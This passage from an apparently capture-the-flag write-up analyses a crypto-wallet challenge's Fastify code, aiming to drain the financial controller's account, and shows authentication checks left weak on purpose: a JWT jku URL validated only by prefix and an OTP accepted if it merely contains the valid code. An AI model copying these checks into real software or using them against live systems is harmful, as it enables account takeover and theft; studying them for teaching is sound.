<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">success</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">status</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk1">result</span><span class="mtk1">.</span><span class="mtk1">error</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>
<span class="mtk1">      </span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">result</span><span class="mtk1">);</span>
<span class="mtk1">          } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">err</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Transaction error:"</span><span class="mtk1">, </span><span class="mtk1">err</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">err</span><span class="mtk1">.status </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk1">err</span><span class="mtk1">.error </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk4">"An unknown error occurred during the transaction.</span><span class="mtk4">"</span><span class="mtk1"> });</span>  
<span class="mtk1">          }</span>
<span class="mtk1">        }</span>
<span class="mtk1">      );</span>
<span class="mtk1">}</span>
</code></pre></div><p>We need to specify <code>to</code>, <code>amount</code> and <code>coin</code> in the transaction request. So, the idea is to create an account on the platform and somehow transfer all the money from <code>FINANCIAL_CONTROLLER_EMAIL</code> to us.</p><p>There is another endpoint to get the balance of the current account:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk9 mtki">fastify</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/balance'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userId</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.email;</span>
<span class="mtk1">    </span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">          </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">balances</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">getBalancesForUser</span><span class="mtk1">(</span><span class="mtk1">userId</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">balances</span><span class="mtk1">);</span>
<span class="mtk1">        } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">          </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">'Error fetching user balances:'</span><span class="mtk1">, </span><span class="mtk1">error</span><span class="mtk1">);</span>
<span class="mtk1">          </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Failed to fetch user balances'</span><span class="mtk1"> });</span>  
<span class="mtk1">        }</span>
<span class="mtk1">      });</span>
</code></pre></div><p>This handler calls <code>getBalancesForUser</code>, implemented in <code>challenge/server/services/coinService.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">getBalancesForUser</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">userId</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">walletKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`wallet:</span><span class="mtk5">${</span><span class="mtk9 mtki">userId</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">wallet</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">hgetAllObject</span><span class="mtk1">(</span><span class="mtk1">walletKey</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">wallet</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk7 mtki">Object</span><span class="mtk1">.</span><span class="mtk8">keys</span><span class="mtk1">(</span><span class="mtk1">wallet</span><span class="mtk1">).</span><span class="mtk1">length</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">COINS</span><span class="mtk1">.</span><span class="mtk8">map</span><span class="mtk1">((</span><span class="mtk9 mtki">coin</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> ({</span>
<span class="mtk1">      </span><span class="mtk1">symbol</span><span class="mtk1">: </span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">symbol</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">name</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">availableBalance</span><span class="mtk1">: </span><span class="mtk6">0</span><span class="mtk1">,</span>
<span class="mtk1">    }));</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">COINS</span><span class="mtk1">.</span><span class="mtk8">map</span><span class="mtk1">((</span><span class="mtk9 mtki">coin</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> ({</span>
<span class="mtk1">    </span><span class="mtk1">symbol</span><span class="mtk1">: </span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">symbol</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">name</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">availableBalance</span><span class="mtk1">: </span><span class="mtk7">parseFloat</span><span class="mtk1">(</span><span class="mtk1">wallet</span><span class="mtk1">[</span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">symbol</span><span class="mtk1">] </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">),</span>  
<span class="mtk1">  }));</span>
<span class="mtk1">};</span>
</code></pre></div><p>So we will get <code>symbol</code>, <code>coin</code> and <code>availableBalance</code>.</p><h3 id="session-management">Session management</h3><p>Alright, but how are user sessions managed? Well, there are some middleware registered in <code>challenge/server/index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">fastify</span><span class="mtk1">.</span><span class="mtk8">register</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">securedRoutes</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">securedRoutes</span><span class="mtk1">.</span><span class="mtk8">addHook</span><span class="mtk1">(</span><span class="mtk4">'preHandler'</span><span class="mtk1">, </span><span class="mtk8">jwksMiddleware</span><span class="mtk1">());</span>
<span class="mtk1">  </span><span class="mtk9 mtki">securedRoutes</span><span class="mtk1">.</span><span class="mtk8">register</span><span class="mtk1">(</span><span class="mtk8">usersRouter</span><span class="mtk1">, { </span><span class="mtk1">prefix</span><span class="mtk1">: </span><span class="mtk4">'/api/users'</span><span class="mtk1"> });</span>
<span class="mtk1">  </span><span class="mtk9 mtki">securedRoutes</span><span class="mtk1">.</span><span class="mtk8">register</span><span class="mtk1">(</span><span class="mtk8">dashboardRouter</span><span class="mtk1">, { </span><span class="mtk1">prefix</span><span class="mtk1">: </span><span class="mtk4">'/api/dashboard'</span><span class="mtk1"> });</span>  
<span class="mtk1">  </span><span class="mtk9 mtki">securedRoutes</span><span class="mtk1">.</span><span class="mtk8">register</span><span class="mtk1">(</span><span class="mtk8">cryptoRoutes</span><span class="mtk1">, { </span><span class="mtk1">prefix</span><span class="mtk1">: </span><span class="mtk4">'/api/crypto'</span><span class="mtk1"> });</span>
<span class="mtk1">});</span>
</code></pre></div><p>This is <code>jwksMiddleware</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { verifyToken } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../services/jwksService.js'</span><span class="mtk1">;</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">jwksMiddleware</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.headers.authorization?.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">' '</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">];</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">token</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Access token is required'</span><span class="mtk1"> });</span>  
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">decoded</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">verifyToken</span><span class="mtk1">(</span><span class="mtk1">token</span><span class="mtk1">);</span>

<span class="mtk1">      </span><span class="mtk9 mtki">req</span><span class="mtk1">.user </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">email</span><span class="mtk1">: </span><span class="mtk1">decoded</span><span class="mtk1">.email,</span>
<span class="mtk1">      };</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">error</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Invalid Signature'</span><span class="mtk1"> });</span>
<span class="mtk1">    }</span>
<span class="mtk1">  };</span>
<span class="mtk1">};</span>
</code></pre></div><p>This middleware takes a JWT token from the <code>Authorization</code> header and tries to verify it. On success, the email is extracted from the JWT token payload and saved in <code>req.user</code> for the next endpoint handlers.</p><p>The JWT implementation uses JSON Web Key Set (JWKS), which is a way to store a pair of private/public keys in order to sign/verify tokens. Obviously, only the public key can be exposed on the web server (this time, it is found at <code>/.well-known/jwks.json</code>).</p><p>The JWT token verification function is this one. It is a bit long, but not very hard to understand:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">verifyToken</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">token</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">decodedHeader</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> jwt.</span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">, { </span><span class="mtk1">complete</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> });</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">decodedHeader</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">decodedHeader</span><span class="mtk1">.header) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: Missing header'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">kid</span><span class="mtk1">, </span><span class="mtk1">jku</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">decodedHeader</span><span class="mtk1">.header;</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jku</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: Missing header jku'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk3">// TODO: is this secure enough?</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jku</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:1337/</span><span class="mtk4">'</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: jku claim does not start with </span><span class="mtk4 detected-link">http://127.0.0.1:1337/</span><span class="mtk4">'</span><span class="mtk1">);</span>  
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">kid</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: Missing header kid'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">kid</span><span class="mtk1"> </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk1">KEY_ID</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: kid does not match the expected ke</span><span class="mtk4">y ID'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">jwks</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">axios</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk1">jku</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">response</span><span class="mtk1">.</span><span class="mtk1">status</span><span class="mtk1"> </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">`Failed to fetch JWKS: HTTP </span><span class="mtk5">${</span><span class="mtk1">response</span><span class="mtk1">.</span><span class="mtk1">status</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk1">jwks</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1">.</span><span class="mtk1">data</span><span class="mtk1">;</span>
<span class="mtk1">        } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">`Error fetching JWKS from jku: </span><span class="mtk5">${</span><span class="mtk1">error</span><span class="mtk1">.message</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jwks</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7 mtki">Array</span><span class="mtk1">.</span><span class="mtk8">isArray</span><span class="mtk1">(</span><span class="mtk1">jwks</span><span class="mtk1">.keys)) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid JWKS: Expected keys array'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">jwk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">jwks</span><span class="mtk1">.keys.</span><span class="mtk8">find</span><span class="mtk1">((</span><span class="mtk9 mtki">key</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">.kid </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk1">kid</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jwk</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid token: kid not found in JWKS'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">jwk</span><span class="mtk1">.alg </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk4">'RS256'</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid key algorithm: Expected RS256'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">jwk</span><span class="mtk1">.n </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">jwk</span><span class="mtk1">.e) {</span>
<span class="mtk1">            </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid JWK: Missing modulus (n) or exponent (e)'</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">publicKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">jwkToPem</span><span class="mtk1">(</span><span class="mtk1">jwk</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">decoded</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> jwt.</span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">, </span><span class="mtk1">publicKey</span><span class="mtk1">, { </span><span class="mtk1">algorithms</span><span class="mtk1">: [</span><span class="mtk4">'RS256'</span><span class="mtk1">] });</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">decoded</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">`Token verification failed: </span><span class="mtk5">${</span><span class="mtk1">error</span><span class="mtk1">.message</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk1">error</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">};</span>
</code></pre></div><p>The JWT token header must include <code>jku</code> (JWKS Key URL) and <code>kid</code> (Key ID) claims, which are useful when JWKS is used. The function checks that <code>jku</code> exists and starts with <code>http://127.0.0.1:1337/</code>. On the other hand, it checks that the <code>kid</code> exists and equals <code>KEY_ID</code>, which is randomly generated as a UUIDv4:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">KEY_ID</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">uuidv4</span><span class="mtk1">();</span>  
</code></pre></div><p>If these checks pass, then the server uses <code>axios</code> to retrieve the public key from the JWKS stored at the <code>jku</code> in order to verify the JWT token.</p><h3 id="otp-implementation">OTP implementation</h3><p>Last but not least, the transactions handler has the following OTP middleware:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { hgetField } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../utils/redisUtils.js'</span><span class="mtk1">;</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">otpMiddleware</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userId</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.email;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">otp</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">redisKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`otp:</span><span class="mtk5">${</span><span class="mtk1">userId</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">validOtp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">hgetField</span><span class="mtk1">(</span><span class="mtk1">redisKey</span><span class="mtk1">, </span><span class="mtk4">'otp'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">otp</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'OTP is missing.'</span><span class="mtk1"> });</span>
<span class="mtk1">      </span><span class="mtk5">return</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">validOtp</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'OTP expired or invalid.'</span><span class="mtk1"> });</span>  
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// TODO: Is this secure enough?</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">otp</span><span class="mtk1">.</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk1">validOtp</span><span class="mtk1">)) {</span>
<span class="mtk1">      </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Invalid OTP.'</span><span class="mtk1"> });</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  };</span>
<span class="mtk1">};</span>
